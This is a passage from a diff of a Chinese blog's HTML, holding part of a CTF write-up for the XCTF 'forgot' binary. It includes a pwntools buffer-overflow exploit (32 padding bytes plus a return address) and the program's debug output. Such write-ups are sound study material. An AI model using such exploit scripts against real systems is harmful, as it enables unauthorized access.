+没错我会输入<span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0x080486CC</span><span class="token punctuation">)</span>具体内容，然后看看到底会判断结果是什么</code></pre>
+<pre class=" language-bash"><code class="language-bash">In <span class="token punctuation">[</span>4<span class="token punctuation">]</span>: payload
+Out<span class="token punctuation">[</span>4<span class="token punctuation">]</span>: <span class="token string">'\xcc\x86\x04\x08'</span></code></pre>
+<p>首先我直接输入\xcc\x86\x04\x08：<br><img src="https://s1.ax1x.com/2020/07/16/UrhfSI.png" alt=""><br>发现确实如我上面所说，会判断为正确（work）</p>
 <p>但是我用脚本执行并输入：<br><img src="https://s1.ax1x.com/2020/07/16/Urh46P.png" alt=""><br>并没有通过判断！！！！<br><strong>看来 用pyhton-pwntools 输入与人工输入是有区别的</strong>。再来看一个：<br><img src="https://s1.ax1x.com/2020/07/16/Urhhlt.png" alt=""><br>这是我第一次想到的脚本，你会发现36个A后面的东西很奇怪，尤其是第一个\还带~的，这些问题有待考究。</p>
 <p>因为p32(0x080486cc)用pwntools输入并不会通过判断所以最终的EXP是：</p>
-<pre><code>from pwn import*
-context.log_level = &#39;debug&#39;
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
 
-#sh = remote(&#39;220.249.52.133&#39;,40479)
-sh = process(&#39;./forgot&#39;)
+<span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',40479)</span>
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./forgot'</span><span class="token punctuation">)</span>
 
-sh.recv()
-sh.sendline(&#39;yh&#39;)
-sh.recv()
-#0x080486cc door
-payload = &#39;A&#39;*32 + p32(0x080486cc)
-print payload
-#gdb.attach(sh)
-sh.sendline(payload)
-sh.interactive()</code></pre><p>结果：</p>
-<pre><code>[DEBUG] Received 0x29 bytes:
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'yh'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#0x080486cc door</span>
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">32</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x080486cc</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> payload
+<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>结果：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x29 bytes:
     00000000  63 61 74 3a  20 2e 2f 66  6c 61 67 3a  20 e6 b2 a1  │cat:│ ./f│lag:│ ···│
     00000010  e6 9c 89 e9  82 a3 e4 b8  aa e6 96 87  e4 bb b6 e6  │····│····│····│····│
     00000020  88 96 e7 9b  ae e5 bd 95  0a                        │····│····│·│
     00000029
 cat: ./flag: 没有那个文件或目录
-[*] Process &#39;./forgot&#39; stopped with exit code 0 (pid 47704)
-[*] Got EOF while reading in interactive
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'./forgot'</span> stopped with <span class="token keyword">exit</span> code 0 <span class="token punctuation">(</span>pid 47704<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive
 $  
 一句话：虽然很操蛋，但是通过自己死磕搞懂了还是挺爽的。</code></pre>
+
             </div>
             <hr/>
 
@@ -833,9 +844,10 @@ $
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">1：checksec[*] &#39;/home/hunter/PWN/XCTF/xctf_challenge/stack2&#39;
+                    <div class="summary">1：checksec[*] '/home/hunter/PWN/XCTF/xctf_challenge/stack2'
     Arch:     i386-32-little
-    RELRO:    Partial R</div>
+    RELRO:    Partial RELRO
+   </div>
                     <div class="publish-info">
                             <span class="publish-date">
                                 <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-15
@@ -963,7 +975,7 @@ $
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">31.5k</span>
+                <span class="white-color">30k</span>
             
 
             
